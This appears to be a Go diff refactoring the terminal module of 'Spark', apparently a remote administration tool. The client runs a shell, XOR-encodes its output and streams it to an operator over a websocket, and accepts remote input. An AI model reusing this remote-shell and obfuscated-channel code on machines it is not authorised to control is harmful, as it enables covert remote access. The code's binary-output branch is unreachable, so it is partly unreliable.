@@ -4,6 +4,7 @@ import (
 	"Spark/client/common"
 	"Spark/modules"
 	"Spark/utils"
+	"Spark/utils/cmap"
 	"encoding/hex"
 	"io"
 	"os/exec"
@@ -14,14 +15,16 @@ import (
 
 type terminal struct {
 	lastPack int64
+	rawEvent []byte
+	escape   bool
 	event    string
-	stop     bool
 	cmd      *exec.Cmd
 	stdout   *io.ReadCloser
 	stderr   *io.ReadCloser
 	stdin    *io.WriteCloser
 }
 
+var terminals = cmap.New[*terminal]()
 var defaultCmd = ``
 
 func init() {
@@ -50,29 +53,46 @@ func InitTerminal(pack modules.Packet) error {
 	if err != nil {
 		return err
 	}
-	termSession := &terminal{
+	rawEvent, _ := hex.DecodeString(pack.Event)
+	session := &terminal{
 		cmd:      cmd,
-		stop:     false,
 		event:    pack.Event,
+		escape:   false,
 		stdout:   &stdout,
 		stderr:   &stderr,
 		stdin:    &stdin,
+		rawEvent: rawEvent,
 		lastPack: utils.Unix,
 	}
 
 	readSender := func(rc io.ReadCloser) {
-		for !termSession.stop {
-			buffer := make([]byte, 512)
+		bufSize := 1024
+		for !session.escape {
+			buffer := make([]byte, 1024)
 			n, err := rc.Read(buffer)
 			buffer = buffer[:n]
 
-			common.WSConn.SendCallback(modules.Packet{Act: `TERMINAL_OUTPUT`, Data: map[string]any{
-				`output`: hex.EncodeToString(buffer),
-			}}, pack)
-			termSession.lastPack = utils.Unix
+			// if output is larger than 1KB, then send binary data
+			if n > 1024 {
+				if bufSize < 32768 {
+					bufSize *= 2
+				}
+				common.WSConn.SendRawData(session.rawEvent, buffer, 21, 00)
+			} else {
+				bufSize = 1024
+				buffer, _ = utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_OUTPUT`, Data: map[string]any{
+					`output`: hex.EncodeToString(buffer),
+				}})
+				buffer = utils.XOR(buffer, common.WSConn.GetSecret())
+				common.WSConn.SendRawData(session.rawEvent, buffer, 21, 01)
+			}
+
+			session.lastPack = utils.Unix
 			if err != nil {
-				termSession.stop = true
-				common.WSConn.SendCallback(modules.Packet{Act: `TERMINAL_QUIT`}, pack)
+				session.escape = true
+				data, _ := utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_QUIT`})
+				data = utils.XOR(data, common.WSConn.GetSecret())
+				common.WSConn.SendRawData(session.rawEvent, data, 21, 01)
 				break
 			}
 		}
@@ -82,74 +102,85 @@ func InitTerminal(pack modules.Packet) error {
 
 	err = cmd.Start()
 	if err != nil {
-		termSession.stop = true
+		session.escape = true
 		return err
 	}
-	terminals.Set(pack.Data[`terminal`].(string), termSession)
+	terminals.Set(pack.Data[`terminal`].(string), session)
 	return nil
 }
 
-func InputTerminal(pack modules.Packet) error {
-	val, ok := pack.GetData(`input`, reflect.String)
+func InputRawTerminal(input []byte, uuid string) {
+	session, ok := terminals.Get(uuid)
 	if !ok {
-		return errDataNotFound
+		return
 	}
-	data, err := hex.DecodeString(val.(string))
-	if err != nil {
-		return errDataInvalid
-	}
+	(*session.stdin).Write(input)
+	session.lastPack = utils.Unix
+}
 
-	val, ok = pack.GetData(`terminal`, reflect.String)
-	if !ok {
-		return errUUIDNotFound
+func InputTerminal(pack modules.Packet) {
+	var err error
+	var uuid string
+	var input []byte
+	var session *terminal
+
+	if val, ok := pack.GetData(`input`, reflect.String); !ok {
+		return
+	} else {
+		if input, err = hex.DecodeString(val.(string)); err != nil {
+			return
+		}
 	}
-	termUUID := val.(string)
-	val, ok = terminals.Get(termUUID)
-	if !ok {
-		common.WSConn.SendCallback(modules.Packet{Act: `TERMINAL_QUIT`, Msg: `${i18n|TERMINAL.SESSION_CLOSED}`}, pack)
-		return nil
+	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
+		return
+	} else {
+		uuid = val.(string)
+		if val, ok = terminals.Get(uuid); ok {
+			session = val.(*terminal)
+		} else {
+			return
+		}
 	}
-	terminal := val.(*terminal)
-	(*terminal.stdin).Write(data)
-	terminal.lastPack = utils.Unix
-	return nil
+	(*session.stdin).Write(input)
+	session.lastPack = utils.Unix
 }
 
 func ResizeTerminal(pack modules.Packet) error {
 	return nil
 }
 
-func KillTerminal(pack modules.Packet) error {
-	val, ok := pack.GetData(`terminal`, reflect.String)
-	if !ok {
-		return errUUIDNotFound
-	}
-	termUUID := val.(string)
-	val, ok = terminals.Get(termUUID)
-	if !ok {
-		common.WSConn.SendCallback(modules.Packet{Act: `TERMINAL_QUIT`, Msg: `${i18n|TERMINAL.SESSION_CLOSED}`}, pack)
-		return nil
-	}
-	terminal := val.(*terminal)
-	terminals.Remove(termUUID)
-	doKillTerminal(terminal)
-	return nil
-}
-
-func PingTerminal(pack modules.Packet) {
-	var termUUID string
-	var termSession *terminal
+func KillTerminal(pack modules.Packet) {
+	var uuid string
 	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
 		return
 	} else {
-		termUUID = val.(string)
+		uuid = val.(string)
 	}
-	if val, ok := terminals.Get(termUUID); !ok {
+	session, ok := terminals.Get(uuid)
+	if !ok {
+		return
+	}
+	terminals.Remove(uuid)
+	data, _ := utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_QUIT`, Msg: `${i18n|TERMINAL.SESSION_CLOSED}`})
+	data = utils.XOR(data, common.WSConn.GetSecret())
+	common.WSConn.SendRawData(session.rawEvent, data, 21, 01)
+	session.escape = true
+	session.rawEvent = nil
+}
+
+func PingTerminal(pack modules.Packet) {
+	var uuid string
+	var session *terminal
+	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
 		return
 	} else {
-		termSession = val.(*terminal)
-		termSession.lastPack = utils.Unix
+		uuid = val.(string)
 	}
+	session, ok := terminals.Get(uuid)
+	if !ok {
+		return
+	}
+	session.lastPack = utils.Unix
 }
 
 func doKillTerminal(terminal *terminal) {
@@ -186,11 +217,10 @@ func healthCheck() {
 		timestamp := now.Unix()
 		// stores sessions to be disconnected
 		keys := make([]string, 0)
-		terminals.IterCb(func(uuid string, t any) bool {
-			termSession := t.(*terminal)
-			if timestamp-termSession.lastPack > MaxInterval {
+		terminals.IterCb(func(uuid string, session *terminal) bool {
+			if timestamp-session.lastPack > MaxInterval {
 				keys = append(keys, uuid)
-				doKillTerminal(termSession)
+				doKillTerminal(session)
 			}
 			return true
 		})
